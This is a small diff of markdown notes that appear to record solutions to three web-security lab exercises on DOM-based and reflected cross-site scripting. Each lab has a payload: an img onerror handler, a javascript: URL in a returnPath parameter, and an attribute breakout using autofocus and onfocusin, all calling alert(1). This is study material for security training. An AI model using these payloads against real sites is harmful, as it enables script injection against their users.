@@ -1,10 +1,8 @@
 # Lab: DOM XSS in innerHTML sink using source
 -> payload: `<img src='123.png' onerror='alert(1)'>`
 
-
 # Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
 payload: `https://ac8e1fa11fa32607c0a0cfa800b700a8.web-security-academy.net/feedback?returnPath=javascript:alert(1)`
-
 
 # Lab: Reflected XSS into attribute with angle brackets HTML-encoded
 -> payload: `" autofocus onfocusin='alert(1)' x="`
